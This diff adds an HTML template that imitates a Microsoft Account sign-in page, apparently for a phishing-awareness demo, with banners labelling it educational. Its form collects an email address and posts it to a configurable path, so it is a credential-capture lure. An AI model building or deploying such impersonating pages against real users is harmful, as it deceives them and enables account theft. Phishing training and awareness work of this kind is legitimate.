@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft Account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-white">
+    <div class="bg-red-100 border border-red-400 text-red-700 p-2 text-center">
+        <strong>EDUCATIONAL DEMO:</strong> {{ warning }}
+    </div>
+
+    <div class="max-w-md mx-auto py-8 px-4">
+        <div class="text-center mb-8">
+            <div class="w-30 h-16 bg-blue-500 rounded flex items-center justify-center mx-auto mb-4">
+                <span class="text-white font-bold text-xl">Microsoft</span>
+            </div>
+            <h1 class="text-2xl font-semibold">Sign in</h1>
+        </div>
+
+        <form action="/{{ custom_path }}/submit" method="POST" class="space-y-4">
+            <input type="email" name="email" placeholder="Email, phone, or Skype" 
+                   class="w-full p-3 border rounded focus:outline-none focus:border-blue-500" required>
+            
+            <div class="text-sm text-gray-600">
+                No account? <a href="#" class="text-blue-600">Create one!</a>
+            </div>
+
+            <a href="#" class="text-blue-600 text-sm block">Sign in with Windows Hello or a security key</a>
+
+            <button type="button" class="border border-gray-300 text-gray-700 w-full p-2 rounded">
+                Next
+            </button>
+        </form>
+
+        <div class="mt-6 p-3 bg-blue-50 rounded text-sm">
+            <strong>Educational:</strong> Microsoft will never ask for credentials via suspicious links.
+        </div>
+    </div>
+</body>
+</html>
